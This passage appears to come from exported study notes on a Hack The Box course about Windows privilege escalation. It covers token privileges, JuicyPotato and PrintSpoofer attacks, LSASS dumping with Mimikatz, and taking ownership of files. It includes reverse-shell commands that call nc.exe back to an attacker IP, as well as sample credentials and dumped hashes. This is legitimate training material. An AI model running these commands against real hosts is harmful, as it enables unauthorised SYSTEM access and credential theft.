with Windows Vista to default to restricting applications from running with full permissions unless necessary. If we compare and contrast the rights available to us as an admin in a non-elevated console vs. an elevated console, we will see that they differ drastically.\n\nBelow are the rights available to a local administrator account on a Windows system.\n\n#### Local Admin User Rights - Elevated\n\nIf we run an elevated command window, we can see the complete listing of rights available to us:\n\nWindows Privileges Overview\n\n```powershell-session\nPS C:\\htb> whoami \n\nwinlpe-srv01\\administrator\n\n\nPS C:\\htb> whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                            Description                                                        State\n========================================= ================================================================== ========\nSeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled\nSeSecurityPrivilege                       Manage auditing and security log                                   Disabled\nSeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled\nSeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled\nSeSystemProfilePrivilege                  Profile system performance                                         Disabled\nSeSystemtimePrivilege                     Change the system time                                             Disabled\nSeProfileSingleProcessPrivilege           Profile single process                                             Disabled\nSeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled\nSeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled\nSeBackupPrivilege                         Back up files and directories                                      Disabled\nSeRestorePrivilege                        Restore files and directories                                      Disabled\nSeShutdownPrivilege                       Shut down the system                                               Disabled\nSeDebugPrivilege                          Debug programs                                                     Disabled\nSeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled\nSeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled\nSeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled\nSeUndockPrivilege                         Remove computer from docking station                               Disabled\nSeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled\nSeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled\nSeCreateGlobalPrivilege                   Create global objects                                              Enabled\nSeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled\nSeTimeZonePrivilege                       Change the time zone                                               Disabled\nSeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled\nSeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled \n```\n\nWhen a privilege is listed for our account in the `Disabled` state, it means that our account has the specific privilege assigned. Still, it cannot be used in an access token to perform the associated actions until it is enabled. Windows does not provide a built-in command or PowerShell cmdlet to enable privileges, so we need some scripting to help us out. We will see ways to abuse various privileges throughout this module and various ways to enable specific privileges within our current process. One example is this PowerShell [script](https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1) which can be used to enable certain privileges, or this [script](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/) which can be used to adjust token privileges.\n\nA standard user, in contrast, has drastically fewer rights.\n\n#### Standard User Rights\n\nWindows Privileges Overview\n\n```powershell-session\nPS C:\\htb> whoami \n\nwinlpe-srv01\\htb-student\n\n\nPS C:\\htb> whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== ========\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Disabled\n```\n\nUser rights increase based on the groups they are placed in or their assigned privileges. Below is an example of the rights granted to users in the `Backup Operators` group. Users in this group do have other rights that UAC currently restricts. Still, we can see from this command that they have the [SeShutdownPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/shut-down-the-system), which means that they can shut down a domain controller that could cause a massive service interruption should they log onto a domain controller locally (not via RDP or WinRM).\n\n#### Backup Operators Rights\n\nWindows Privileges Overview\n\n```powershell-session\nPS C:\\htb> whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== ========\nSeShutdownPrivilege           Shut down the system           Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Disabled\n```\n\n---\n\n## Detection\n\nThis [post](https://blog.palantir.com/windows-privilege-abuse-auditing-detection-and-defense-3078a403d74e) is worth a read for more information on Windows privileges as well as detecting and preventing abuse, specifically by logging event [4672: Special privileges assigned to new logon](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4672) which will generate an event if certain sensitive privileges are assigned to a new logon session. This can be fine-tuned in many ways, such as by monitoring privileges that should _never_ be assigned or those that should only ever be assigned to specific accounts.\n\n---\n\n## Moving On\n\nAs attackers and defenders, we need to review the membership of these groups. It's not uncommon to find seemingly low privileged users added to one or more of these groups, which can be used to compromise a single host or further access within an Active Directory environment. We will discuss the implications of some of the most common rights and walk through exercises on how to escalate privileges if we obtain access to a user with some of these rights assigned to their account.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/17-Windows Privilege Escalation/08-SeImpersonate and SeAssignPrimaryToken",
    "path": "02_CPTS/17-Windows Privilege Escalation/08-SeImpersonate and SeAssignPrimaryToken.md",
    "title": "08 SeImpersonate And SeAssignPrimaryToken",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "SeImpersonate and SeAssignPrimaryToken --- In Windows, every process has a token that has information about the account that is running it. These tokens are not considered secure resources, as they ar...",
    "category": "02_CPTS",
    "content": "# SeImpersonate and SeAssignPrimaryToken\n\n---\n\nIn Windows, every process has a token that has information about the account that is running it. These tokens are not considered secure resources, as they are just locations within memory that could be brute-forced by users that cannot read memory. To utilize the token, the `SeImpersonate` privilege is needed. It is only given to administrative accounts, and in most cases, can be removed during system hardening. An example of using this token would be [CreateProcessWithTokenW](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw).\n\nLegitimate programs may utilize another process's token to escalate from Administrator to Local System, which has additional privileges. Processes generally do this by making a call to the WinLogon process to get a SYSTEM token, then executing itself with that token placing it within the SYSTEM space. Attackers often abuse this privilege in the \"Potato style\" privescs - where a service account can `SeImpersonate`, but not obtain full SYSTEM level privileges. Essentially, the Potato attack tricks a process running as SYSTEM to connect to their process, which hands over the token to be used.\n\nWe will often run into this privilege after gaining remote code execution via an application that runs in the context of a service account (for example, uploading a web shell to an ASP.NET web application, achieving remote code execution through a Jenkins installation, or by executing commands through MSSQL queries). Whenever we gain access in this way, we should immediately check for this privilege as its presence often offers a quick and easy route to elevated privileges. This [paper](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt) is worth reading for further details on token impersonation attacks.\n\n---\n\n## SeImpersonate Example - JuicyPotato\n\nLet's take the example below, where we have gained a foothold on a SQL server using a privileged SQL user. Client connections to IIS and SQL Server may be configured to use Windows Authentication. The server may then need to access other resources such as file shares as the connecting client. It can be done by impersonating the user whose context the client connection is established. To do so, the service account will be granted the [Impersonate a client after authentication](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication) privilege.\n\nIn this scenario, the SQL Service service account is running in the context of the default `mssqlserver` account. Imagine we have achieved command execution as this user using `xp_cmdshell` using a set of credentials obtained in a `logins.sql` file on a file share using the `Snaffler` tool.\n\n#### Connecting with MSSQLClient.py\n\nUsing the credentials `sql_dev:Str0ng_P@ssw0rd!`, let's first connect to the SQL server instance and confirm our privileges. We can do this using [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) from the `Impacket` toolkit.\n\nSeImpersonate and SeAssignPrimaryToken\n\n```shell-session\ndrxh3kr@htb[/htb]$ mssqlclient.py sql_dev@10.129.43.30 -windows-auth\n\nImpacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation\n\nPassword:\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\n[*] INFO(WINLPE-SRV01\\SQLEXPRESS01): Line 1: Changed database context to 'master'.\n[*] INFO(WINLPE-SRV01\\SQLEXPRESS01): Line 1: Changed language setting to us_english.\n[*] ACK: Result: 1 - Microsoft SQL Server (130 19162) \n[!] Press help for extra shell commands\nSQL>\n```\n\n#### Enabling xp_cmdshell\n\nNext, we must enable the `xp_cmdshell` stored procedure to run operating system commands. We can do this via the Impacket MSSSQL shell by typing `enable_xp_cmdshell`. Typing `help` displays a few other command options.\n\nSeImpersonate and SeAssignPrimaryToken\n\n```shell-session\nSQL> enable_xp_cmdshell\n\n[*] INFO(WINLPE-SRV01\\SQLEXPRESS01): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.\n[*] INFO(WINLPE-SRV01\\SQLEXPRESS01): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install\n```\n\nNote: We don't actually have to type `RECONFIGURE` as Impacket does this for us.\n\n#### Confirming Access\n\nWith this access, we can confirm that we are indeed running in the context of a SQL Server service account.\n\nSeImpersonate and SeAssignPrimaryToken\n\n```shell-session\nSQL> xp_cmdshell whoami\n\noutput                                                                             \n\n--------------------------------------------------------------------------------   \n\nnt service\\mssql$sqlexpress01\n```\n\n#### Checking Account Privileges\n\nNext, let's check what privileges the service account has been granted.\n\nSeImpersonate and SeAssignPrimaryToken\n\n```shell-session\nSQL> xp_cmdshell whoami /priv\n\noutput                                                                             \n\n--------------------------------------------------------------------------------   \n                                                                    \nPRIVILEGES INFORMATION                                                             \n\n----------------------                                                             \nPrivilege Name                Description                               State      \n\n============================= ========================================= ========   \n\nSeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   \nSeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   \nSeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    \nSeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    \nSeImpersonatePrivilege        Impersonate a client after authentication Enabled    \nSeCreateGlobalPrivilege       Create global objects                     Enabled    \nSeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   \n```\n\nThe command `whoami /priv` confirms that [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege) is listed. This privilege can be used to impersonate a privileged account such as `NT AUTHORITY\\SYSTEM`. [JuicyPotato](https://github.com/ohpe/juicy-potato) can be used to exploit the `SeImpersonate` or `SeAssignPrimaryToken` privileges via DCOM/NTLM reflection abuse.\n\n#### Escalating Privileges Using JuicyPotato\n\nTo escalate privileges using these rights, let's first download the `JuicyPotato.exe` binary and upload this and `nc.exe` to the target server. Next, stand up a Netcat listener on port 8443, and execute the command below where `-l` is the COM server listening port, `-p` is the program to launch (cmd.exe), `-a` is the argument passed to cmd.exe, and `-t` is the `createprocess` call. Below, we are telling the tool to try both the [CreateProcessWithTokenW](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw) and [CreateProcessAsUser](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera) functions, which need `SeImpersonate` or `SeAssignPrimaryToken` privileges respectively.\n\nSeImpersonate and SeAssignPrimaryToken\n\n```shell-session\nSQL> xp_cmdshell c:\\tools\\JuicyPotato.exe -l 53375 -p c:\\windows\\system32\\cmd.exe -a \"/c c:\\tools\\nc.exe 10.10.14.3 8443 -e cmd.exe\" -t *\n\noutput                                                                             \n\n--------------------------------------------------------------------------------   \n\nTesting {4991d34b-80a1-4291-83b6-3328366b9097} 53375                               \n                                                                            \n[+] authresult 0                                                                   \n{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\\SYSTEM                                                                                                    \n[+] CreateProcessWithTokenW OK                                                     \n[+] calling 0x000000000088ce08\n```\n\n#### Catching SYSTEM Shell\n\nThis completes successfully, and a shell as `NT AUTHORITY\\SYSTEM` is received.\n\nSeImpersonate and SeAssignPrimaryToken\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nc -lnvp 8443\n\nlistening on [any] 8443 ...\nconnect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 50332\nMicrosoft Windows [Version 10.0.14393]\n(c) 2016 Microsoft Corporation. All rights reserved.\n\n\nC:\\Windows\\system32>whoami\n\nwhoami\nnt authority\\system\n\n\nC:\\Windows\\system32>hostname\n\nhostname\nWINLPE-SRV01\n```\n\n---\n\n## PrintSpoofer and RoguePotato\n\nJuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. However, [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) and [RoguePotato](https://github.com/antonioCoco/RoguePotato) can be used to leverage the same privileges and gain `NT AUTHORITY\\SYSTEM` level access. This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) goes in-depth on the `PrintSpoofer` tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.\n\n#### Escalating Privileges using PrintSpoofer\n\nLet's try this out using the `PrintSpoofer` tool. We can use the tool to spawn a SYSTEM process in your current console and interact with it, spawn a SYSTEM process on a desktop (if logged on locally or via RDP), or catch a reverse shell - which we will do in our example. Again, connect with `mssqlclient.py` and use the tool with the `-c` argument to execute a command. Here, using `nc.exe` to spawn a reverse shell (with a Netcat listener waiting on our attack box on port 8443).\n\nSeImpersonate and SeAssignPrimaryToken\n\n```shell-session\nSQL> xp_cmdshell c:\\tools\\PrintSpoofer.exe -c \"c:\\tools\\nc.exe 10.10.14.3 8443 -e cmd\"\n\noutput                                                                             \n\n--------------------------------------------------------------------------------   \n\n[+] Found privilege: SeImpersonatePrivilege                                        \n\n[+] Named pipe listening...                                                        \n\n[+] CreateProcessAsUser() OK                                                       \n\nNULL \n```\n\n#### Catching Reverse Shell as SYSTEM\n\nIf all goes according to plan, we will have a SYSTEM shell on our netcat listener.\n\nSeImpersonate and SeAssignPrimaryToken\n\n```shell-session\ndrxh3kr@htb[/htb]$ nc -lnvp 8443\n\nlistening on [any] 8443 ...\nconnect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 49847\nMicrosoft Windows [Version 10.0.14393]\n(c) 2016 Microsoft Corporation. All rights reserved.\n\n\nC:\\Windows\\system32>whoami\n\nwhoami\nnt authority\\system\n```\n\nEscalating privileges by leveraging `SeImpersonate` is very common. It is essential to be familiar with the various methods available to us depending on the target host OS version and level.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/17-Windows Privilege Escalation/09-SeDebugPrivilege",
    "path": "02_CPTS/17-Windows Privilege Escalation/09-SeDebugPrivilege.md",
    "title": "09 SeDebugPrivilege",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "SeDebugPrivilege --- To run a particular application or service or assist with troubleshooting, a user might be assigned the SeDebugPrivilege instead of adding the account into the administrators grou...",
    "category": "02_CPTS",
    "content": "# SeDebugPrivilege\n\n---\n\nTo run a particular application or service or assist with troubleshooting, a user might be assigned the [SeDebugPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs) instead of adding the account into the administrators group. This privilege can be assigned via local or domain group policy, under `Computer Settings > Windows Settings > Security Settings`. By default, only administrators are granted this privilege as it can be used to capture sensitive information from system memory, or access/modify kernel and application structures. This right may be assigned to developers who need to debug new system components as part of their day-to-day job. This user right should be given out sparingly because any account that is assigned it will have access to critical operating system components.\n\nDuring an internal penetration test, it is often helpful to use websites such as LinkedIn to gather information about potential users to target. Suppose we are, for example, retrieving many NTLMv2 password hashes using `Responder` or `Inveigh`. In that case, we may want to focus our password hash cracking efforts on possible high-value accounts, such as developers who are more likely to have these types of privileges assigned to their accounts. A user may not be a local admin on a host but have rights that we cannot enumerate remotely using a tool such as BloodHound. This would be worth checking in an environment where we obtain credentials for several users and have RDP access to one or more hosts but no additional privileges.\n\n![Windows User Rights Assignment showing 'Debug programs' assigned to Administrators group under Local Policies.](https://academy.hackthebox.com/storage/modules/67/debug.png)\n\nAfter logging on as a user assigned the `Debug programs` right and opening an elevated shell, we see `SeDebugPrivilege` is listed.\n\nSeDebugPrivilege\n\n```cmd-session\nC:\\htb> whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                            Description                                                        State\n========================================= ================================================================== ========\nSeDebugPrivilege                          Debug programs                                                     Disabled\nSeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled\nSeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled\n```\n\nWe can use [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) from the [SysInternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) suite to leverage this privilege and dump process memory. A good candidate is the Local Security Authority Subsystem Service ([LSASS](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)) process, which stores user credentials after a user logs on to a system.\n\nSeDebugPrivilege\n\n```cmd-session\nC:\\htb> procdump.exe -accepteula -ma lsass.exe lsass.dmp\n\nProcDump v10.0 - Sysinternals process dump utility\nCopyright (C) 2009-2020 Mark Russinovich and Andrew Richards\nSysinternals - www.sysinternals.com\n\n[15:25:45] Dump 1 initiated: C:\\Tools\\Procdump\\lsass.dmp\n[15:25:45] Dump 1 writing: Estimated dump file size is 42 MB.\n[15:25:45] Dump 1 complete: 43 MB written in 0.5 seconds\n[15:25:46] Dump count reached.\n```\n\nThis is successful, and we can load this in `Mimikatz` using the `sekurlsa::minidump` command. After issuing the `sekurlsa::logonPasswords` commands, we gain the NTLM hash of the local administrator account logged on locally. We can use this to perform a pass-the-hash attack to move laterally if the same local administrator password is used on one or multiple additional systems (common in large organizations).\n\nNote: It is always a good idea to type \"log\" before running any commands in \"Mimikatz\" this way all command output will put output to a \".txt\" file. This is especially useful when dumping credentials from a server which may have many sets of credentials in memory.\n\nSeDebugPrivilege\n\n```cmd-session\nC:\\htb> mimikatz.exe\n\n  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29\n .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n ## \\ / ##       > https://blog.gentilkiwi.com/mimikatz\n '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/\n\nmimikatz # log\nUsing 'mimikatz.log' for logfile : OK\n\nmimikatz # sekurlsa::minidump lsass.dmp\nSwitch to MINIDUMP : 'lsass.dmp'\n\nmimikatz # sekurlsa::logonpasswords\nOpening : 'lsass.dmp' file for minidump...\n\nAuthentication Id : 0 ; 23196355 (00000000:0161f2c3)\nSession           : Interactive from 4\nUser Name         : DWM-4\nDomain            : Window Manager\nLogon Server      : (null)\nLogon Time        : 3/31/2021 3:00:57 PM\nSID               : S-1-5-90-0-4\n        msv :\n        tspkg :\n        wdigest :\n         * Username : WINLPE-SRV01$\n         * Domain   : WORKGROUP\n         * Password : (null)\n        kerberos :\n        ssp :\n        credman :\n\n<SNIP> \n\nAuthentication Id : 0 ; 23026942 (00000000:015f5cfe)\nSession           : RemoteInteractive from 2\nUser Name         : jordan\nDomain            : WINLPE-SRV01\nLogon Server      : WINLPE-SRV01\nLogon Time        : 3/31/2021 2:59:52 PM\nSID               : S-1-5-21-3769161915-3336846931-3985975925-1000\n        msv :\n         [00000003] Primary\n         * Username : jordan\n         * Domain   : WINLPE-SRV01\n         * NTLM     : cf3a5525ee9414229e66279623ed5c58\n         * SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2\n        tspkg :\n        wdigest :\n         * Username : jordan\n         * Domain   : WINLPE-SRV01\n         * Password : (null)\n        kerberos :\n         * Username : jordan\n         * Domain   : WINLPE-SRV01\n         * Password : (null)\n        ssp :\n        credman :\n\n<SNIP>\n\n```\n\nSuppose we are unable to load tools on the target for whatever reason but have RDP access. In that case, we can take a manual memory dump of the `LSASS` process via the Task Manager by browsing to the `Details` tab, choosing the `LSASS` process, and selecting `Create dump file`. After downloading this file back to our attack system, we can process it using Mimikatz the same way as the previous example.\n\n![Windows Task Manager showing lsass.exe process selected. Context menu open with 'Create dump file' option highlighted.](https://academy.hackthebox.com/storage/modules/67/WPE_taskmgr_lsass.png)\n\n---\n\n## Remote Code Execution as SYSTEM\n\nWe can also leverage `SeDebugPrivilege` for [RCE](https://decoder.cloud/2018/02/02/getting-system/). Using this technique, we can elevate our privileges to SYSTEM by launching a [child process](https://docs.microsoft.com/en-us/windows/win32/procthread/child-processes) and using the elevated rights granted to our account via `SeDebugPrivilege` to alter normal system behavior to inherit the token of a [parent process](https://docs.microsoft.com/en-us/windows/win32/procthread/processes-and-threads) and impersonate it. If we target a parent process running as SYSTEM (specifying the Process ID (or PID) of the target process or running program), then we can elevate our rights quickly. Let's see this in action.\n\nFirst, transfer this [PoC script](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1) over to the target system. Next we just load the script and run it with the following syntax `[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,\"\")`. Note that we must add a third blank argument `\"\"` at the end for the PoC to work properly.\n\nThe PoC script has received an update. Please visit its GitHub repository and review its usage. https://github.com/decoder-it/psgetsystem\n\nFirst, open an elevated PowerShell console (right-click, run as admin, and type in the credentials for the `jordan` user). Next, type `tasklist` to get a listing of running processes and accompanying PIDs.\n\nSeDebugPrivilege\n\n```powershell-session\nPS C:\\htb> tasklist \n\nImage Name                     PID Session Name        Session#    Mem Usage\n========================= ======== ================ =========== ============\nSystem Idle Process              0 Services                   0          4 K\nSystem                           4 Services                   0        116 K\nsmss.exe                       340 Services                   0      1,212 K\ncsrss.exe                      444 Services                   0      4,696 K\nwininit.exe                    548 Services                   0      5,240 K\ncsrss.exe                      556 Console                    1      5,972 K\nwinlogon.exe                   612 Console                    1     10,408 K\n```\n\nHere we can target `winlogon.exe` running under PID 612, which we know runs as SYSTEM on Windows hosts.\n\n![PowerShell window running script to start cmd.exe as NT AUTHORITY\\SYSTEM. Command prompt shows successful execution with SYSTEM privileges.](https://academy.hackthebox.com/storage/modules/67/psgetsys_winlogon.png)\n\nWe could also use the [Get-Process](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-process?view=powershell-7.2) cmdlet to grab the PID of a well-known process that runs as SYSTEM (such as LSASS) and pass the PID directly to the script, cutting down on the number of steps required.\n\n![PowerShell script running to start cmd.exe as NT AUTHORITY\\SYSTEM. Command prompt confirms execution with SYSTEM privileges.](https://academy.hackthebox.com/storage/modules/67/psgetsys_lsass.png)\n\nOther tools such as [this one](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC) exist to pop a SYSTEM shell when we have `SeDebugPrivilege`. Often we will not have RDP access to a host, so we'll have to modify our PoCs to either return a reverse shell to our attack host as SYSTEM or another command, such as adding an admin user. Play around with these PoCs and see what other ways you can achieve SYSTEM access, especially if you do not have a fully interactive session, such as when you achieve command injection or have a web shell or reverse shell connection as the user with `SeDebugPrivilege`. Keep these examples in mind in case you ever run into a situation where dumping LSASS does not result in any useful credentials (though we can get SYSTEM access with just the machine NTLM hash, but that's outside the scope of this module) and a shell or RCE as SYSTEM would be beneficial.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/17-Windows Privilege Escalation/10-SeTakeOwnershipPrivilege",
    "path": "02_CPTS/17-Windows Privilege Escalation/10-SeTakeOwnershipPrivilege.md",
    "title": "10 SeTakeOwnershipPrivilege",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "SeTakeOwnershipPrivilege --- SeTakeOwnershipPrivilege grants a user the ability to take ownership of any \"securable object,\" meaning Active Directory objects, NTFS files/folders, printers, registry ke...",
    "category": "02_CPTS",
    "content": "# SeTakeOwnershipPrivilege\n\n---\n\n[SeTakeOwnershipPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects) grants a user the ability to take ownership of any \"securable object,\" meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes. This privilege assigns [WRITE_OWNER](https://docs.microsoft.com/en-us/windows/win32/secauthz/standard-access-rights) rights over an object, meaning the user can change the owner within the object's security descriptor. Administrators are assigned this privilege by default. While it is rare to encounter a standard user account with this privilege, we may encounter a service account that, for example, is tasked with running backup jobs and VSS snapshots assigned this privilege. It may also be assigned a few others such as `SeBackupPrivilege`, `SeRestorePrivilege`, and `SeSecurityPrivilege` to control this account's privileges at a more granular level and not granting the account full local admin rights. These privileges on their own could likely be used to escalate privileges. Still, there may be times when we need to take ownership of specific files because other methods are blocked, or otherwise, do not work as expected. Abusing this privilege is a bit of an edge case. Still, it is worth understanding in-depth, especially since we may also find ourselves in a scenario in an Active Directory environment where we can assign this right to a specific user that we can control and leverage it to read a sensitive file on a file share.\n\n![Advanced Security Settings for web.config file. Permissions list includes IIS_IUSRS with Read & execute, TrustedInstaller, SYSTEM, Administrators, and jordan with Full control.](https://academy.hackthebox.com/storage/modules/67/change_owner.png)\n\nThe setting can be set in Group Policy under:\n\n- `Computer Configuration` ⇾ `Windows Settings` ⇾ `Security Settings` ⇾ `Local Policies` ⇾ `User Rights Assignment`\n\n![Local Group Policy Editor showing 'Take ownership of files or other objects' policy. Default set to Administrators. Description warns of security risks and advises assigning to trusted users only.](https://academy.hackthebox.com/storage/modules/67/setakeowner2.png)\n\nWith this privilege, a user could take ownership of any file or object and make changes that could involve access to sensitive data, `Remote Code Execution` (`RCE`) or `Denial-of-Service` (DOS).\n\nSuppose we encounter a user with this privilege or assign it to them through an attack such as GPO abuse using [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse). In that case, we could use this privilege to potentially take control of a shared folder or sensitive files such as a document containing passwords or an SSH key.\n\n---\n\n## Leveraging the Privilege\n\n#### Reviewing Current User Privileges\n\nLet's review our current user's privileges.\n\nSeTakeOwnershipPrivilege\n\n```powershell-session\nPS C:\\htb> whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                                              State\n============================= ======================================================= ========\nSeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking                                Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set                          Disabled\n```\n\n#### Enabling SeTakeOwnershipPrivilege\n\nNotice from the output that the privilege is not enabled. We can enable it using this [script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) which is detailed in [this](https://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/) blog post, as well as [this](https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77) one which builds on the initial concept.\n\nSeTakeOwnershipPrivilege\n\n```powershell-session\nPS C:\\htb> Import-Module .\\Enable-Privilege.ps1\nPS C:\\htb> .\\EnableAllTokenPrivs.ps1\nPS C:\\htb> whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\nPrivilege Name                Description                              State\n============================= ======================================== =======\nSeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking                 Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set           Enabled\n```\n\n#### Choosing a Target File\n\nNext, choose a target file and confirm the current ownership. For our purposes, we'll target an interesting file found on a file share. It is common to encounter file shares with `Public` and `Private` directories with subdirectories set up by department. Given a user's role in the company, they can often access specific files/directories. Even with a structure like this, a sysadmin may misconfigure permissions on directories and subdirectories, making file shares a rich source of information for us once we have obtained Active Directory credentials (and sometimes even without needing credentials). For our scenario, let's assume that we have access to the target company's file share and can freely browse both the `Private` and `Public` subdirectories. For the most part, we find that permissions are set up strictly, and we have not found any interesting information on the `Public` portion of the file share. In browsing the `Private` portion, we find that all Domain Users can list the contents of certain subdirectories but get an `Access denied` message when trying to read the contents of most files. We find a file named `cred.txt` under the `IT` subdirectory of the `Private` share folder during our enumeration.\n\nGiven that our user account has `SeTakeOwnershipPrivilege` (which may have already been granted), or we exploit some other misconfiguration such as an overly permissive Group Policy Object (GPO) to grant our user account that privilege) we can leverage it to read any file of our choosing.\n\nNote: Take great care when performing a potentially destructive action like changing file ownership, as it could cause an application to stop working or disrupt user(s) of the target object. Changing the ownership of an important file, such as a live web.config file, is not something we would do without consent from our client first. Furthermore, changing ownership of a file buried down several subdirectories (while changing each subdirectory permission on the way down) may be difficult to revert and should be avoided.\n\nLet's check out our target file to gather a bit more information about it.\n\nSeTakeOwnershipPrivilege\n\n```powershell-session\nPS C:\\htb> Get-ChildItem -Path 'C:\\Department Shares\\Private\\IT\\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name=\"Owner\";Expression={ (Get-Acl $_.FullName).Owner }}\n \nFullName                                 LastWriteTime         Attributes Owner\n--------                                 -------------         ---------- -----\nC:\\Department Shares\\Private\\IT\\cred.txt 6/18/2021 12:23:28 PM    Archive\n```\n\n#### Checking File Ownership\n\nWe can see that the owner is not shown, meaning that we likely do not have enough permissions over the object to view those details. We can back up a bit and check out the owner of the IT directory.\n\nSeTakeOwnershipPrivilege\n\n```powershell-session\nPS C:\\htb> cmd /c dir /q 'C:\\Department Shares\\Private\\IT'\n\n Volume in drive C has no label.\n Volume Serial Number is 0C92-675B\n \n Directory of C:\\Department Shares\\Private\\IT\n \n06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\\sccm_svc  .\n06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\\sccm_svc  ..\n06/18/2021  12:23 PM                36 ...                    cred.txt\n               1 File(s)             36 bytes\n               2 Dir(s)  17,079,754,752 bytes free\n```\n\nWe can see that the IT share appears to be owned by a service account and does contain a file `cred.txt` with some data inside it.\n\n#### Taking Ownership of the File\n\nNow we can use the [takeown](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown) Windows binary to change ownership of the file.\n\nSeTakeOwnershipPrivilege\n\n```powershell-session\nPS C:\\htb> 